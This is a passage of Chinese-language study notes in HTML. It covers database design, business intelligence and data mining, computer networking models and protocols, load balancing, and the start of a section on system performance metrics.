逻辑结构设计的主要任务是确定数据模型、将E-R图转换为指定的数据模型、确定完整性约束、确定用户视图。</li><li>物理结构设计<br />  对已确定的数据库逻辑结构，利用DBMS提供的方法技术，以较优的存储结构和数据存取路径、合理的数据存放位置以及存储分配，设计出一个高效的、可实现的数据库物理结构。<br />  主要工作有存储记录的格式设计、存储结构设计、存取方法设计和确定系统配置。</li><li>数据库应用程序设计<br />  数据库应用系统一方面是对用户信息进行存储，另一方面是对用户处理要求进行实现。<br />  主要工作有选择设计方法、确定开发计划、选择系统架构、设计安全性策略。<br />  设计方法有结构化设计方法和面向对象设计方法两种。</li><li>数据库运行和维护<br />  主要工作有数据库的转储与恢复，数据库的安全性和完整性控制，数据库性能的监督、分析和改造，数据库的重组和重构等。</li></ol><h3 id="223-分布式数据库"><a class="markdownIt-Anchor" href="#223-分布式数据库"></a> 2.2.3 分布式数据库</h3><h4 id="1-分布式数据库的概念"><a class="markdownIt-Anchor" href="#1-分布式数据库的概念"></a> 1. 分布式数据库的概念</h4><p>  分布式数据库是针对地理上分散，管理上又需要不同程度集中管理的需求而提出的一种数据管理信息系统。<br />  满足分布性、逻辑相关性、场地透明性和场地自治性的数据库系统被称为完全分布式数据库系统。<br />  分布式数据库系统的特点是集中控制性、数据独立性、数据冗余可控性、场地自治性和存取的有效性。</p><h4 id="2-分布式数据库的架构"><a class="markdownIt-Anchor" href="#2-分布式数据库的架构"></a> 2. 分布式数据库的架构</h4><p>  分布式数据库可抽象为4层的结构模式，划分为<code>全局外层</code>、<code>全局概念层</code>、<code>局部概念层</code>、<code>局部内层</code>，各层之间还有相应的层间映射。</p><p><img src="https://pic.lufer.cc/images/2021/04/12/image.png" alt="分布式数据库架构图" /></p><h3 id="224-商业智能"><a class="markdownIt-Anchor" href="#224-商业智能"></a> 2.2.4 商业智能</h3><h4 id="1-商业智能的基本概念"><a class="markdownIt-Anchor" href="#1-商业智能的基本概念"></a> 1. 商业智能的基本概念</h4><p>  商业智能（BI）是企业对商业数据的搜集、管理和分析的系统过程，目的是使企业的各级决策者获得知识或洞察力，帮助他们做出对企业更有利的决策。<br />  商业智能系统主要实现将原始业务数据转换为企业决策信息的过程。它主要包括<code>数据预处理</code>、<code>建立数据仓库</code>、<code>数据分析</code>及<code>数据展现</code>4个阶段。<br />  一般认为<code>数据仓库</code>、<code>联机分析处理</code>和<code>数据挖掘技术</code>是商业智能的三大组成部分。</p><h4 id="2-数据仓库"><a class="markdownIt-Anchor" href="#2-数据仓库"></a> 2. 数据仓库</h4><p>  著名的数据仓库专家 W.H.Inmon 在《Building the Data Warehouse》一书中将数据仓库定义为：数据仓库（Data Warehouse）是一个<code>面向主题的</code>、<code>集成的</code>、<code>相对稳定的</code>、且<code>随时间变化的</code>数据集合，用于支持管理决策。<br />  数据仓库采用三层架构，底层是数据仓库服务器、中间层是OLAP服务器、顶层是前端工具，如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/04/12/image20b3552fe02f9d10.png" alt="数据仓库架构" /></p><p>  数据仓库的实现步骤有规划、需求研究、问题分析、数据的抽取清洗集成装载、数据仓库设计、分析报表查询、数据仓库性能优化及数据仓库的部署发布等几个步骤。<br />  数据仓库的实现方法主要有<code>自顶向下法</code>、<code>自底向上法</code>和<code>联合方法</code>。</p><h4 id="3-多维分析海量数据分析器olap"><a class="markdownIt-Anchor" href="#3-多维分析海量数据分析器olap"></a> 3. 多维分析海量数据分析器——OLAP</h4><p>  联机分析处理OLAP利用多维的概念，提供了切片、切块、下钻、上卷和旋转等多维度分析与跨纬度分析功能。<br />  OLAP系统架构主要分为<code>基于关系数据库的ROLAP</code>，<code>基于多维数据库的MOLAP</code>，<code>基于混合数据组织的HOLAP</code>三种。</p><h4 id="4-数据挖掘"><a class="markdownIt-Anchor" href="#4-数据挖掘"></a> 4. 数据挖掘</h4><p>  从技术角度看，数据挖掘就是从大量的、不完全的、有噪声的、模糊的、随机的实际应用数据中，提取隐含在其中的、人们事先不知道的、但又是潜在有用的信息和知识的过程。<br />  从商业角度来看，数据挖掘是一种新的商业信息处理技术，其主要特点是对商业数据库中的大量业务数据进行抽取、转换、分析和其他模型化处理，从中提取辅助商业决策的关键性数据。<br />  数据挖掘与传统的数据分析（如查询、报表、联机应用分析）的本质区别是数据挖掘是在没有明确假设的前提下去挖掘信息、发现知识。数据挖掘所得到的信息应具有<code>先知</code>，<code>有效</code>和<code>可实用</code>三个特征。</p><ol><li>数据挖掘的功能<br />  数据挖掘的目标是从数据库中发现隐含的、有意义的知识，主要有以下五类功能：<ul><li>自动预测趋势和行为<br />  数据挖掘自动在大型数据库中寻找预测性信息，以往需要进行大量手工分析的问题如今可以迅速直接由数据本身得出结论。一个典型的例子是市场预测问题，数据挖掘使用过去有关促销的数据来寻找未来投资中回报最大的用户，其他可预测的问题包括预报破产及认定对指定事件最可能做出反应的群体。</li><li>关联分析<br />  数据关联是数据库中存在的一类重要的可被发现的知识。若两个或多个变量的取值之间存在某种规律性，就称为关联。关联可分为简单关联、时序关联、因果关联。关联分析的目的是找出数据库中隐藏的关联网。有时并不知道数据库中数据的关联函数，即使知道也是不确定的，因此关联分析生成的规则带有可信度。</li><li>聚类<br />  数据库中的记录可被划分为一系列有意义的子集，即聚类。聚类增强了人们对客观现实的认识，是概念描述和偏差分析的先决条件。聚类技术主要包括传统的模式识别方法和数学分类学。20 世纪 80 年代初，Mchalski 提出了概念聚类技术及其要点，即在划分对象时不仅要考虑对象之间的距离，还要求划分出的类具有某种内涵描述，从而避免了传统技术的某些片面性。</li><li>概念描述<br />  概念描述就是对某类对象的内涵进行描述，并概括这类对象的有关特征。概念描述分为特征性描述和区别性描述，前者描述某类对象的共同特征，后者描述不同类对象之间的区别。生成一个类的特征性描述只涉及该类对象中所有对象的共性。生成区别性描述的方法很多，如决策树方法、遗传算法等。</li><li>偏差检测<br />  数据库中的数据常有一些异常记录，从数据库中检测这些偏差很有意义。偏差包括很多潜在的知识，如分类中的反常实例、不满足规则的特例、观测结果与模型预测值的偏差、量值随时间的变化等。偏差检测的基本方法是，寻找观测结果与参照值之间有意义的差别。</li></ul></li><li>常用的数据挖掘技术<br />  常用的数据挖掘技术包括关联分析、序列分析、分类、预测、聚类分析及时间序列分析等。<ul><li>关联分析<br />  关联分析主要用于发现不同事件之间的关联性，即一个事件发生的同时，另一个事件也经常发生。关联分析的重点在于快速发现那些有实用价值的关联发生的事件。其主要依据是事件发生的概率和条件概率应该符合一定的统计意义。<br />  对于结构化的数据，以客户的购买习惯数据为例，利用关联分析，可以发现客户的关联购买需要。例如，一个开设储蓄账户的客户很可能同时进行债券交易和股票交易，购买纸尿裤的男顾客经常同时购买啤酒等。利用这种知识可以采取积极的营销策略，扩展客户购买的产品范围，吸引更多的客户。通过调整商品的布局便于顾客买到经常同时购买的商品，或者通过降低一种商品的价格来促进另一种商品的销售等。<br />  对于非结构化的数据，以空间数据为例，利用关联分析，可以发现地理位置的关联性。例如，85%的靠近高速公路的大城镇与水相邻，或者发现通常与高尔夫球场相邻的对象等。</li><li>序列分析<br />  序列分析技术主要用于发现一定时间间隔内接连发生的事件。这些事件构成一个序列，发现的序列应该具有普遍意义，其依据除了统计上的概率之外，还要加上时间的约束。</li><li>分类分析<br />  分类分析通过分析具有类别的样本的特点，得到决定样本属于各种类别的规则或方法。利用这些规则和方法对未知类别的样本分类时应该具有一定的准确度。其主要方法有基于统计学的贝叶斯方法、神经网络方法、决策树方法及支持向量机（support vector machines）等。<br />  利用分类技术，可以根据顾客的消费水平和基本特征对顾客进行分类，找出对商家有较大利益贡献的重要客户的特征，通过对其进行个性化服务，提高他们的忠诚度。<br />  利用分类技术，可以将大量的半结构化的文本数据，如 WEB 页面、电子邮件等进行分类。可以将图片进行分类，例如，根据已有图片的特点和类别，可以判定一幅图片属于何种类型的规则。对于空间数据，也可以进行分类分析，例如，可以根据房屋的地理位置决定房屋的档次。</li><li>聚类分析<br />  聚类分析是根据物以类聚的原理，将本身没有类别的样本聚集成不同的组，并且对每一个这样的组进行描述的过程。其主要依据是聚到同一个组中的样本应该彼此相似，而属于不同组的样本应该足够不相似。<br />  仍以客户关系管理为例，利用聚类技术，根据客户的个人特征及消费数据，可以将客户群体进行细分。例如，可以得到这样的一个消费群体：女性占 91%，全部无子女、年龄在 31岁到 40 岁占 70%，高消费级别的占 64%，买过针织品的占 91%，买过厨房用品的占 89%，买过园艺用品的占 79%。针对不同的客户群，可以实施不同的营销和服务方式，从而提高客户的满意度。<br />  对于空间数据，根据地理位置及障碍物的存在情况可以自动进行区域划分。例如，根据分布在不同地理位置的 ATM 机的情况将居民进行区域划分，根据这一信息，可以有效地进行 ATM 机的设置规划，避免浪费，同时也避免失掉每一个商机。<br />  对于文本数据，利用聚类技术可以根据文档的内容自动划分类别，从而便于文本的检索。</li><li>预测<br />  预测与分类类似，但预测是根据样本的已知特征估算某个连续类型的变量的取值的过程，而分类则只是用于判别样本所属的离散类别而已。预测常用的技术是回归分析。</li><li>时间序列<br />  分析时间序列分析的是随时间而变化的事件序列，目的是预测未来发展趋势，或者寻找相似发展模式或者是发现周期性发展规律。</li></ul></li><li>数据挖掘的流程<br />  数据挖掘的流程为确定挖掘对象、准备数据、建立模型、数据挖掘、结果分析和知识应用。</li><li>数据挖掘的应用<br />  数据挖掘的热点包括空间数据库的挖掘、多媒体数据库的挖掘、时序数据和序列数据的挖掘、文本数据库的挖掘、Web挖掘。</li></ol><h2 id="23-计算机网络基础知识"><a class="markdownIt-Anchor" href="#23-计算机网络基础知识"></a> 2.3 计算机网络基础知识</h2><h3 id="231-网络概述"><a class="markdownIt-Anchor" href="#231-网络概述"></a> 2.3.1 网络概述</h3><p>  计算机网络是指利用通信设备和线路将地理位置分散的、功能独立的计算机系统或由计算机控制的外部设备连接起来，在网络操作系统的控制下，按照约定的通信协议进行信息交换、实现资源共享的系统。<br />  计算机网络的组成元素有<code>网络节点</code>和<code>通信链路</code>。<br />  计算机网络的功能有<code>数据通信</code>、<code>资源共享</code>、<code>负载均衡</code>和<code>高可靠性</code>。</p><p>  计算机网络按<code>通信距离</code>可分为<code>广域网</code>、<code>局域网</code>和<code>城域网</code>。<br />  按<code>信息交换方式</code>可分为<code>电路交换网</code>、<code>分组交换网</code>和<code>综合交换网</code>。<br />  按<code>网络拓扑结构</code>可分为<code>星形网</code>、<code>树形网</code>、<code>环形网</code>和<code>总线网</code>。<br />  按<code>通信介质</code>可分为<code>双绞线网</code>、<code>同轴电缆网</code>、<code>光纤网</code>和<code>卫星网</code>。<br />  按<code>传输带宽</code>可分为<code>基带网</code>和<code>宽带网</code>。<br />  按<code>使用范围</code>可分为<code>公用网</code>和<code>专用网</code>。<br />  按<code>速率</code>可分为<code>高速网</code>、<code>中速网</code>和<code>低速网</code>。<br />  按<code>通信方式</code>可分为<code>广播式</code>和<code>点到点式</code>。<br />  按<code>使用方式</code>可分为<code>校园网</code>和<code>企业网</code>。<br />  按<code>连接范围</code>可分为<code>内联网</code>和<code>外联网</code>。<br />  按<code>网络提供的服务</code>可分为<code>通信网</code>和<code>信息网</code>。</p><h4 id="1-网络互联模型osirm"><a class="markdownIt-Anchor" href="#1-网络互联模型osirm"></a> 1. 网络互联模型（OSI/RM）</h4><p>  1977 年，国际标准化组织为适应网络标准化发展的需求，制定了开放系统互联参考模型（Open System Interconnection/Reference Model，OSI/RM），从而形成了网络架构的国际标准。OSI/RM 构造了由下到上的七层模型，分别是物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。<br />  在数据传输过程中，每一层都承担不同的功能和任务，以实现对数据传输过程中的各个阶段的控制。</p><ol><li>物理层<br />  物理层的主要功能是透明地完成相邻节点之间原始比特流的传输。其中“透明”的意思是指物理层并不需要关心比特代表的具体含义，而要考虑的是如何发送“0”和“1”，以及接收端如何识别。物理层在传输介质基础上作为系统和通信介质的接口，为数据链路层提供服务。</li><li>数据链路层<br />  数据链路层负责在两个相邻节点之间的线路上无差错地传送以帧为单位的数据，通过流量控制和差错控制，将原始不可靠的物理层连接变成无差错的数据通道，并解决多用户竞争问题，使之对网络层显现一条可靠的链路。</li><li>网络层<br />  网络层是通信子网的最高层，其主要任务是在数据链路层服务的基础上，实现整个通信子网内的连接，并通过网络连接交换网络服务数据单元（packet）。它主要解决数据传输单元分组在通信子网中的路由选择、拥塞控制和多个网络互联的问题。网络层建立网络连接为传输层提供服务。</li><li>传输层<br />  传输层既是负责数据通信的最高层，又是面向网络通信的低三层（物理层、数据链路层和网络层）和面向信息处理的高三层（会话层、表示层和应用层）之间的中间层，是资源子网和通信子网的桥梁，其主要任务是为两台计算机的通信提供可靠的端到端的数据传输服务。传输层反映并扩展了网络层子系统的服务功能，并通过传输层地址为高层提供传输数据的通信端口，使系统之间高层资源的共享不必考虑数据通信方面的问题。</li><li>会话层<br />  会话层利用传输层提供的端到端数据传输服务，具体实施服务请求者与服务提供者之间的通信、组织和同步它们的会话 活动，并管理它们的数据交换过程。会话层提供服务通常需要经过建立连接、数据传输和释放连接三个阶段。会话层是最薄的一层，常被省略。</li><li>表示层<br />  表示层处理的是用户信息的表示问题。端用户（应用进程）之间传送的数据包含语义和语法两个方面。语义是数据的内容及其含义，它由应用层负责处理；语法是与数据表示形式有关的方面，例如，数据的格式、编码和压缩等。表示层主要用于处理应用实体面向交换的信息的表示方法，包括用户数据的结构和在传输时的比特流（或字节流）的表示。这样，即使每个应用系统有各自的信息表示法，但被交换的信息类型和数值仍能用一种共同的方法来描述。</li><li>应用层<br />  应用层是直接面向用户的一层，是计算机网络与最终用户之间的界面。在实际应用中，通常把会话层和表示层归入到应用层，使 OSI/RM 成为一个简化的五层模型。</li></ol><h4 id="2tcpip-结构模型"><a class="markdownIt-Anchor" href="#2tcpip-结构模型"></a> 2．TCP/IP 结构模型</h4><p>  虽然 OSI/RM 已成为计算机网络架构的标准模型，但因为 OSI/RM 的结构过于复杂，实际系统中采用 OSI/RM 的并不多。目前，使用最广泛的可互操作的网络架构是 TCP/IP（Transmission Control Protocol/ Internet Protocol，传输控制协议/网际协议）结构模型。<br />  与OSI/RM 结构不同，不存在一个正式的 TCP/IP 结构模型，但可根据已开发的协议标准和通信任务将其大致分成四个比较独立的层次，分别是网络接口层、网络互联层、传输层和应用层。</p><ol><li>网络接口层<br />  网络接口层大致对应于 OSI/RM 的数据链路层和物理层，TCP/IP 协议不包含具体的物理层和数据链路层，只定义了网络接口层作为物理层的接口规范。网络接口层处在 TCP/IP 结构模型的最底层，主要负责管理为物理网络准备数据所需的全部服务程序和功能。</li><li>网络互联层<br />  网络互联层也称为网络层、互联网层或网际层，负责将数据报独立地从信源传送到信宿，主要解决路由选择、阻塞控制和网络互联等问题，在功能上类似于OSI/RM 中的网络层。</li><li>传输层<br />  传输层负责在信源和信宿之间提供端到端的数据传输服务，相当于 OSI/RM中的传输层。</li><li>应用层<br />  应用层直接面向用户应用，为用户方便地提供对各种网络资源的访问服务，包含了 OSI/RM 会话层和表示层中的部分功能。</li></ol><h4 id="3-常见的网络协议"><a class="markdownIt-Anchor" href="#3-常见的网络协议"></a> 3. 常见的网络协议</h4><ol><li>应用层协议<br />  在应用层中，定义了很多面向应用的协议，应用程序通过本层协议利用网络完成数据交互的任务。这些协议主要有 FTP、TFTP、HTTP、SMTP、DHCP、Telnet、DNS 和 SNMP 等。<br />  FTP（File TransportProtocol，文件传输协议）是网络上两台计算机传送文件的协议，运行在 TCP 之上，是通过 Internet 将文件从一台计算机传输到另一台计算机的一种途径。FTP 的传输模式包括 Bin（二进制）和 ASCII（文本文件）两种，除了文本文件之外，都应该使用二进制模式传输。FTP 在客户机和服务器之间需建立两条 TCP 连接，一条用于传送控制信息（使用 21 号端口），另一条用于传送文件内容（使用 20 号端口）。<br />  TFTP（Trivial FileTransfer Protocol，简单文件传输协议）是用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。TFTP 建立在 UDP（UserDatagram Protocol，用户数据报协议）之上，提供不可靠的数据流传输服务，不提供存取授权与认证机制，使用超时重传方式来保证数据的到达。<br />  HTTP（Hypertext TransferProtocol，超文本传输协议）是用于从 WWW 服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。HTTP 建立在 TCP之上，它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示等。<br />  SMTP（Simple Mail TransferProtocol，简单邮件传输协议）建立在 TCP 之上，是一种提供可靠且有效的电子邮件传输的协议。SMTP 是建模在 FTP 文件传输服务上的一种邮件服务，主要用于传输系统之间的邮件信息，并提供与电子邮件有关的通知。<br />  DHCP（Dynamic HostConfiguration Protocol，动态主机配置协议）建立在 UDP 之上，是基于客户机/服务器模型设计的。所有的 IP 网络设定数据都由 DHCP 服务器集中管理，并负责处理客户端的 DHCP 要求；而客户端则会使用从服务器分配下来的 IP 环境数据。DHCP 通过租约（默认为 8 天）的概念，有效且动态地分配客户端的 TCP/IP 设定。当租约过半时，客户机需要向 DHCP 服务器申请续租；当租约超过 87.5%时，如果仍然没有和当初提供 IP 的 DHCP 服务器联系上，则开始联系其他的 DHCP 服务器。DHCP 分配的 IP 地址可以分为三种方式，分别是固定分配、动态分配和自动分配。<br />  Telnet（远程登录协议）是登录和仿真程序，建立在 TCP 之上，它的基本功能是允许用户登录进入远程计算机系统。以前，Telnet 是一个将所有用户输入送到远程计算机进行处理的简单的终端程序。目前，它的一些较新的版本是在本地执行更多的处理，可以提供更好的响应，并且减少了通过链路发送到远程计算机的信息数量。<br />  DNS（Domain NameSystem，域名系统）在 Internet 上域名与 IP 地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相识别 IP 地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，DNS 就是进行域名解析的服务器。DNS 通过对用户友好的名称查找计算机和服务。当用户在应用程序中输入 DNS 名称时，DNS 服务可以将此名称解析为与之相关的其他信息，例如，IP 地址。<br />  SNMP（Simple NetworkManagement Protocol，简单网络管理协议）是为了解决 Internet上的路由器管理问题而提出的，它可以在 IP、IPX、AppleTalk 和其他传输协议上使用。SNMP是指一系列网络管理规范的集合，包括协议本身、数据结构的定义和一些相关概念。目前，SNMP 已成为网络管理领域中事实上的工业标准，并被广泛支持和应用，大多数网络管理系统和平台都是基于 SNMP 的。</li><li>传输层协议<br />  传输层主要有两个传输协议，分别是 TCP 和 UDP（User Datagram Protocol，用户数据报协议），这些协议负责提供流量控制、错误校验和排序服务。<br />  TCP 是整个 TCP/IP 协议族中最重要的协议之一，它在 IP 协议提供的不可靠数据服务的基础上，采用了重发技术，为应用程序提供了一个可靠的、面向连接的、全双工的数据传输服务。TCP 协议一般用于传输数据量比较少，且对可靠性要求高的场合。<br />  UDP 是一种不可靠的、无连接的协议，可以保证应用程序进程间的通信，与 TCP 相比，UDP 是一种无连接的协议，它的错误检测功能要弱得多。可以这样说，TCP 有助于提供可靠性，而 UDP 则有助于提高传输速率。UDP 协议一般用于传输数据量大，对可靠性要求不是很高，但要求速度快的场合。</li><li>网络层协议<br />  网络层中的协议主要有 IP、ICMP（Internet Control Message Protocol，网际控制报文协议）、IGMP（Internet Group Management Protocol，网际组管理协议）、ARP（Address ResolutionProtocol，地址解析协议）和 RARP（Reverse Address Resolution Protocol，反向地址解析协议）等，这些协议处理信息的路由和主机地址解析。<br />  IP 所提供的服务通常被认为是无连接的和不可靠的，它将差错检测和流量控制之类的服务授权给了其他的各层协议，这正是 TCP/IP 能够高效率工作的一个重要保证。网络层的功能主要由 IP 来提供，除了提供端到端的分组分发功能外，IP 还提供很多扩充功能。例如，为了克服数据链路层对帧大小的限制，网络层提供了数据分块和重组功能，这使得很大的 IP数据包能以较小的分组在网络上传输。<br />  ARP 用于动态地完成 IP 地址向物理地址的转换。物理地址通常是指计算机的网卡地址，也称为 MAC（Media Access Control，媒体访问控制）地址，每块网卡都有唯一的地址；RARP用于动态完成物理地址向 IP 地址的转换。<br />  ICMP 是一个专门用于发送差错报文的协议，由于 IP 协议是一种尽力传送的通信协议，即传送的数据可能丢失、重复、延迟或乱序传递，所以需要一种尽量避免差错并能在发生差错时报告的机制，这就是 ICMP 的功能。<br />  IGMP 允许 Internet 中的计算机参加多播，是计算机用作向相邻多目路由器报告多目组成员的协议。多目路由器是支持组播的路由器，它向本地网络发送 IGMP 查询，计算机通过发送 IGMP 报告来应答查询。多目路由器负责将组播包转发到网络中所有组播成员。</li></ol><h3 id="232-局域网与广域网"><a class="markdownIt-Anchor" href="#232-局域网与广域网"></a> 2.3.2 局域网与广域网</h3><h4 id="1-局域网"><a class="markdownIt-Anchor" href="#1-局域网"></a> 1. 局域网</h4><p>  局域网（Local Area Network，LAN）是指传输距离有限，传输速度较高，以共享网络资源为目的的网络系统。<br />  局域网通常具备以下特点：</p><ol><li>分布范围有限</li><li>数据传输速率高</li><li>误码率低</li><li>协议相对简单、结构灵活，建网成本低、周期短，便于管理和扩充<br />  构成局域网的网络拓扑结构主要有星形结构、总线结构、环形结构和网状结构。</li></ol><h4 id="2-广域网"><a class="markdownIt-Anchor" href="#2-广域网"></a> 2. 广域网</h4><p>  广域网是指覆盖范围广、传输速率相对较低，以数据通信为主要目的的数据通信网。</p><h3 id="233-网络管理与网络安全"><a class="markdownIt-Anchor" href="#233-网络管理与网络安全"></a> 2.3.3 网络管理与网络安全</h3><h4 id="1-网络管理"><a class="markdownIt-Anchor" href="#1-网络管理"></a> 1. 网络管理</h4><p>  网络管理是对计算机网络的配置、运行状态和计费等进行的管理。<br />  OSI网络管理标准中定义了网络管理的五大功能：<code>配置管理</code>、<code>性能管理</code>、<code>故障管理</code>、<code>安全管理</code>和<code>计费管理</code>。</p><h4 id="2-计算机网络安全"><a class="markdownIt-Anchor" href="#2-计算机网络安全"></a> 2. 计算机网络安全</h4><p>  计算机网络安全是指计算机、网络系统的硬件、软件及系统中的数据受到保护，不因偶然或恶意的原因而遭到破坏、更改、泄露，确保系统能够连续和可靠的运行。<br />  信息安全的基本要素是<code>保密性</code>、<code>完整性</code>、<code>可用性</code>、<code>真实性</code>和<code>可控性</code>。<br />  完整的信息安全保障体系应该包括<code>保护</code>、<code>检测</code>、<code>响应</code>和<code>恢复</code>4个方面。</p><h3 id="234-网络工程"><a class="markdownIt-Anchor" href="#234-网络工程"></a> 2.3.4 网络工程</h3><p>  网络工程是根据用户单位的需求和具体情况，结合当前网络技术的发展和产品化程度，经过充分的需求分析和市场调研，确定网络建设方案，依据方案有计划、分步骤地实施。<br />  网络工程可分为网络规划和网络设计阶段、工程组织和实施阶段以及系统运行维护阶段。</p><h3 id="235-存储及负载均衡技术"><a class="markdownIt-Anchor" href="#235-存储及负载均衡技术"></a> 2.3.5 存储及负载均衡技术</h3><h4 id="1-raid技术"><a class="markdownIt-Anchor" href="#1-raid技术"></a> 1. RAID技术</h4><p>  RAID是一种由多块廉价磁盘构成的冗余阵列。使用磁盘阵列的目的是建立数据冗余、增强容错、提高容量、增进性能。</p><h4 id="2-网络存储技术"><a class="markdownIt-Anchor" href="#2-网络存储技术"></a> 2. 网络存储技术</h4><p>  网络存储采用面向网络的存储体系结构，是数据处理和数据存储分离，由专门的系统负责数据处理，存储设备或子系统负责数据的存储。<br />  网络存储体系结构大致分为三种：直连式存储（DAS）、网络连接存储（NAS）和存储区域存储（SAN）。</p><h4 id="3-负载均衡技术"><a class="markdownIt-Anchor" href="#3-负载均衡技术"></a> 3. 负载均衡技术</h4><p>  负载均衡是由多台服务器以对称的方式组成一个服务器集合，每台服务器都具有等价的地位，都可以单独对外提供服务而无须其他服务器的辅助。通过某种负载分担技术，将外部发送来的请求均匀地分配到对称结构中的某一台服务器上，而接收到请求的服务器独立地回应客户的请求。<br />  负载均衡从结构上分为本地负载均衡（Local Server Load Balance）和全域负载均衡（Global Server Load Balance），前者是指对本地的服务器群做负载均衡，后者是指对分别放置在不同的地理位置、有不同的网络及服务器群之间做负载均衡。<br />  负载均衡的实现方法有两种：</p><ol><li>把大量并发访问或数据流量分配到多个设备上处理，以减少用户等待响应的时间。</li><li>将���个重负载的运算分摊到多个设备上做并行处理，再将每个设备的运行结果汇总后返回给用户。</li></ol><p>  目前，比较常用的负载均衡技术主要有以下几种：</p><ol><li>基于特定服务器软件的负载均衡<br />  很多网络协议都支持“重定向”功能，例如，在 HTTP 协议中支持 Location 指令，接收到这个指令的浏览器将自动重定向到 Location 指明的另一个 URL 上。由于发送 Location 指令比起执行服务请求，对 Web 服务器的负载要小得多，因此可以根据这个功能来设计一种负载均衡的服务器。当 Web 服务器认为自己负载较大的时候，它就不再直接发送回浏览器请求的网页，而是送回一个 Location 指令，让浏览器在服务器集群中的其他服务器上获得所需要的网页。</li><li>基于 DNS（Domain Name Server，域名服务器）的负载均衡<br />  通过 DNS 服务中的随机名字解析来实现负载均衡，在 DNS 服务器中，可以为多个不同的地址配置同一个名字，而最终查询这个名字的客户机将在解析这个名字时得到其中一个地址。因此，对于同一个名字，不同的客户机会得到不同的地址，它们也就访问不同地址上的 Web 服务器，从而达到负载均衡的目的。<br />  DNS 负载均衡的优点是简单易行，并且服务器可以位于互联网的任意位置上。然而它也存在不少缺点，一个缺点是为了保证 DNS 数据及时更新，一般都要将 DNS 的刷新时间设置得较小，但太小就会造成太大的额外网络流量，并且更改了 DNS 数据之后也不能立即生效；另一个缺点是 DNS 负载均衡无法得知服务器之间的差异，它不能做到为性能较好的服务器多分配请求，也不能了解到服务器的当前状态，甚至会出现客户请求集中在某一台服务器上的偶然情况。</li><li>反向代理负载均衡<br />  使用代理服务器可以将请求转发给内部的 Web 服务器，使用这种加速模式显然可以提升静态网页的访问速度。因此也可以考虑使用这种技术，让代理服务器将请求均匀地转发给多台内部 Web 服务器，从而达到负载均衡的目的。这种代理方式与普通的代理方式有所不同，标准代理方式是客户使用代理访问多个外部 Web 服务器，而这种代理方式是多个客户使用它访问内部 Web 服务器，因此也被称为反向代理模式。<br />  使用反向代理的好处是，可以将负载均衡和代理服务器的高速缓存技术结合在一起，以提供有益的性能；其具备额外的安全性，外部客户不能直接访问真实的服务器。并且实现起来可以采用较好的负载均衡策略，将负载非常均衡地分给内部服务器，不会出现负载集中到某个服务器的偶然现象。</li><li>基于 NAT（Network Address Translation，网络地址转换）的负载均衡技术<br />  网络地址转换指的是在内部地址和外部地址之间进行转换，以便具备内部地址的计算机能访问外部网络，而当外部网络中的计算机访问地址转换网关拥有的某一外部地址时，地址转换网关能将其转发到一个映射的内部地址上。因此如果地址转换网关能将每个连接均匀转换为不同的内部服务器地址，此后，外部网络中的计算机就各自与自己转换得到的地址上的服务器进行通信，从而达到负载分担的目的。<br />  地址转换可以通过软件方式来实现，也可以通过硬件方式来实现。使用硬件方式进行操作一般称为交换，而当交换必须保存 TCP 连接信息的时候，这种针对 OSI/RM 网络层的操作就被称为第四层交换。</li><li>扩展的负载均衡技术<br />  更好的方式是使用一种半中心的负载均衡方式。在这种半中心的负载均衡方式下，即当客户请求发送给负载均衡器的时候，中心负载均衡器将请求打包并发送给某个服务器，而服务器的回应请求不再返回给中心负载均衡器，而是直接返回给客户，因此中心负载均衡器只负责接受并转发请求，其网络负担就较小了。</li></ol><h4 id="4-服务器集群技术"><a class="markdownIt-Anchor" href="#4-服务器集群技术"></a> 4. 服务器集群技术</h4><p>  集群是一组互相独立的服务器在网络中表现为单一的系统，并以单一系统的模式加以管理。</p><h2 id="25-系统性能"><a class="markdownIt-Anchor" href="#25-系统性能"></a> 2.5 系统性能</h2><p>  系统性能是一个系统提供给用户的众多性能指标的混合体。它既包括硬件性能，也包括软件性能；既包括部件性能指标，也包括综合性能指标。<br />  系统性能包括以下4个方面的内容：</p><ol><li>性能指标<br />  描述当前流行系统主要涉及的性能指标；</li><li>性能计算<br />  描述当前使用到的主要性能指标的计算方法；</li><li>性能设计<br />  描述如何对现有系统进行性能上的调整优化；</li><li>性能评估<br />  描述如何对当前取得的性能指标进行评价和改进。</li></ol><h3 id="251-性能指标"><a class="markdownIt-Anchor" href="#251-性能指标"></a> 2.5.1 性能指标</h3><h3 id="252-性能计算"><a class="markdownIt-Anchor" href="#252-性能计算"></a> 2.5.2 性能计算</h3><p>  性能指标计算的主要方法有定义法、公式法、程序检测法和仪器检测法。</p><h4 id="1-mips的计算方法"><a class="markdownIt-Anchor" href="#1-mips的计算方法"></a> 1. MIPS的计算方法</h4><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mi>I</mi><mi>P</mi><mi>S</mi><mo>=</mo><mfrac><mtext>指令条数</mtext><mrow><mtext>执行时间</mtext><mo>×</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow></mfrac><mo>=</mo><mfrac><mrow><mi>F</mi><mi>z</mi></mrow><mrow><mi>C</mi><mi>P</mi><mi>I</mi></mrow></mfrac><mo>=</mo><mi>I</mi><mi>P</mi><mi>C</mi><mo>×</mo><mi>F</mi><mi>z</mi></mrow><annotation encoding="application/x-tex">MIPS = \frac{\text{指令条数}}{\text{执行时间} \times 10^6}=\frac{Fz}{CPI} = IPC \times Fz </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.1296600000000003em;vertical-align:-0.7693300000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t 